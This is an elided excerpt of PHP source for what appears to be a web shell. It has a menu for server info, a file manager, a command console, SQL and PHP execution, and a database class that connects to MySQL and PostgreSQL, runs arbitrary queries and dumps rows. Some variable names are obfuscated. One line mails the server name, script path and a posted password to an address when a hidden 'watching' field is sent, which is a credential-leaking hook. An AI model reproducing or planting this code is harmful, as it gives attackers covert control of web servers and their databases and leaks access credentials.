...
<input type=hidden name=charset>
	...
	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Sql'=>'Sql','Php'=>'Php');
	if(!empty($GLOBALS['▛']))
	$m['Logout'] = 'Logout';
...
if(array_key_exists('watching',$_POST)){
	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('', 'root', $tmp); // Edit or delete!
}
...
function actionSql() {
	class DbClass {
		...
		function connect($host, $user, $pass, $dbname){
			switch($this->type)	{
				case 'mysql':
					if( $this->link = @($GLOBALS["___mysqli_ston"] = mysqli_connect($host, $user, $pass)) ) return true;
					break;
				case 'pgsql':
					$host = explode(':', $host);
		...
		function selectdb($db) {
			switch($this->type)	{
				case 'mysql':
					if (@mysqli_select_db($GLOBALS["___mysqli_ston"], $db))return true;
					break;
			}
			return false;
		}
		function query($str) {
			switch($this->type) {
				case 'mysql':
					return $this->res = @mysqli_query($GLOBALS["___mysqli_ston"], $str);
					break;
				case 'pgsql':
			...
			switch($this->type)	{
				case 'mysql':
					if(function_exists('mysqli_set_charset'))
						return @((bool)mysqli_set_charset( $this->link, "$str"));
					else
					...
					while($▟ = $this->fetch()) {
						...
						foreach($▟ as $k=>$v) {
                            ...
                            elseif(is_int($v))
                                ...
                                $▟[$k] = "'".@mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $v)."'";
							$columns[] = "`".$k."`";
						}
                        if($head) {
